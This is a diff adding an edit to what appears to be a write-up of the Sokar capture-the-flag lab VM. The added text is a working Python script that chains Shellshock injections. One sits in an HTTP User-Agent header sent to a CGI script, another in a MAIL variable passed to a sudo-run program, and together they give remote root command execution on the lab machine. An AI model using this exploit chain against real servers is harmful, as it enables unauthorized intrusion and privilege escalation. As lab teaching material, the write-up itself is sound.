@@ -1033,4 +1033,41 @@ cat /etc/sysconfig/iptables
 COMMIT
 ```
 
+## edit
+
+I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the `lime` script run with `sudo` can be shocked too!
+
+```python
+#!/usr/bin/python
+
+# 2015 Leon Jacobs
+# sokar remote root command execution
+
+import requests
+import sys
+
+if len(sys.argv) < 2:
+
+    print " * Usage %s <cmd>" % sys.argv[0]
+    sys.exit(1)
+
+# Grab the command from the args
+command = sys.argv[1].strip()
+
+# prep to shock the lime script
+root_command = """echo "N" | sudo MAIL=\\"() { :;}; %s;\\" /home/bynarr/lime""" % command
+
+# prep to exec the command as bynarr
+payload = """/usr/bin/python -c "import time; time.sleep(1); print 'fruity'" | /usr/bin/python -c "import pty; pty.spawn(['/bin/su','-c','%s', 'bynarr']);" """ % root_command
+
+# be verbose about the full command
+print " * Executing %s\n" % payload
+
+# Send the sploit
+headers = { "User-Agent": "() { :;};echo;%s" % payload }
+print requests.get("http://192.168.217.163:591/cgi-bin/cat", headers=headers).text.strip()
+```
+
+Run with `python root.py "/bin/cat /root/flag"` :D
+
 Thanks to [@_RastaMouse](https://twitter.com/_RastaMouse) for the VM, and as always, [@VulnHub](https://twitter.com/VulnHub) for the hosting and great community!
